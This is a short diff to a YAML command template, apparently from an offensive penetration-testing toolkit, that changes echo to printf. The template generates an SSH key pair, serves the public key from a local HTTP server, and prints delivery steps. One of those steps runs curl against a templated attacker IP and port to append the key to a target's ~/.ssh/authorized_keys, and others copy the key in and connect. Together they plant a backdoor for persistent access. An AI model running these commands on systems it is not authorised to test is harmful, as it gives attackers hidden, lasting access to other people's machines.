@@ -7,10 +7,10 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; ssh-keygen -t rsa -b 4096 -f ~/.ssh/id69_rsa -N ""; cp -n ~/.ssh/id69_rsa.pub packstation/outbound/; \
-  echo '================================================================'; \
-  echo '                       -----Linux------                         '; \
-  echo 'Deliver (without credentials): mkdir -p ~/.ssh && curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/id69_rsa.pub >> ~/.ssh/authorized_keys'; \
-  echo 'Deliver (with credentials): ssh-copy-id -i ~/.ssh/id69_rsa <user>@<remote_ip>'
-  echo 'Connect to box: ssh -i ~/.ssh/id69_rsa <user>@<remote_ip>'
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                       -----Linux------                         '; \
+  printf '%s\n' 'Deliver (without credentials): mkdir -p ~/.ssh && curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/id69_rsa.pub >> ~/.ssh/authorized_keys'; \
+  printf '%s\n' 'Deliver (with credentials): ssh-copy-id -i ~/.ssh/id69_rsa <user>@<remote_ip>'
+  printf '%s\n' 'Connect to box: ssh -i ~/.ssh/id69_rsa <user>@<remote_ip>'
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
